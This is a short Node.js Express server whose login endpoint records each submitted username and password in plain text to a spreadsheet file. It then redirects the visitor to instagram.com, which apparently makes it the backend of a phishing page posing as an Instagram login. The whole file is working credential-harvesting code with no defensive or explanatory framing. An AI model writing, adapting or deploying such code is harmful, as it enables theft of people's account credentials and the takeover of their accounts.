const express = require('express');
const bodyParser = require('body-parser');
const xlsx = require('xlsx');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname))); // Serve static files

// Endpoint to handle login
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Create or read the existing workbook
    const filePath = path.join(__dirname, 'pdata.xlsx');
    let workbook;

    try {
        workbook = xlsx.readFile(filePath);
    } catch (error) {
        // If the file doesn't exist, create a new workbook
        workbook = xlsx.utils.book_new();
    }

    // Create a new worksheet from the provided data
    const newRow = [{ Username: username, Password: password }];
    const worksheet = xlsx.utils.json_to_sheet(newRow, { header: ['Username', 'Password'], skipHeader: true });

    // Append the new worksheet to the workbook
    xlsx.utils.book_append_sheet(workbook, worksheet, 'Sheet1');

    // Write the workbook to the file
    xlsx.writeFile(workbook, filePath);

    // Send a JSON response with the redirect URL
    res.json({ redirectUrl: 'https://www.instagram.com/' });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
